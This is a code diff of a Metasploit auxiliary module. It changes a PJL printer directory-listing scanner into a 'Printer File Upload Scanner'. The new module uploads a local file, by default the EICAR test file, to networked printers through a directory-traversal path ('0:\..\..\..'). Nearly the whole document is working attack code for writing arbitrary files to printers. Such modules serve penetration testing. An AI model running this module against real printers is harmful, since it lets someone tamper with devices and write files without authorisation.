@@ -14,9 +14,9 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      "Name" => "Printer Directory Listing Scanner",
+      "Name" => "Printer File Upload Scanner",
       "Description" => %q{
-        This module lists a directory on a set of printers using the
+        This module uploads a file to a set of printers using the
         Printer Job Language (PJL) protocol.
       },
       "Author" => [
@@ -34,33 +34,28 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
-      OptString.new("PATH", [true, "Remote path", '0:\..\..\..'])
+      OptPath.new("LPATH", [true, "Local path",
+        File.join(Msf::Config.data_directory, "eicar.com")]),
+      OptString.new("RPATH", [true, "Remote path", '0:\..\..\..\eicar.com'])
     ], self.class)
   end
 
   def run_host(ip)
-    path = datastore["PATH"]
+    lpath = datastore["LPATH"]
+    rpath = datastore["RPATH"]
 
     connect
     pjl = Rex::Proto::PJL::Client.new(sock)
     pjl.begin_job
 
-    pjl.fsinit(path[0..1])
-    listing = pjl.fsdirlist(path)
+    pjl.fsinit(rpath[0..1])
+
+    if pjl.fsdownload(lpath, rpath)
+      print_good("#{rhost}:#{rport} - Saved #{lpath} to #{rpath}")
+    end
 
     pjl.end_job
     disconnect
-
-    if listing
-      print_good("#{ip}:#{rport} - #{listing}")
-      report_note(
-        :host => ip,
-        :port => rport,
-        :proto => "tcp",
-        :type => "printer.dir.listing",
-        :data => listing
-      )
-    end
   end
 
 end
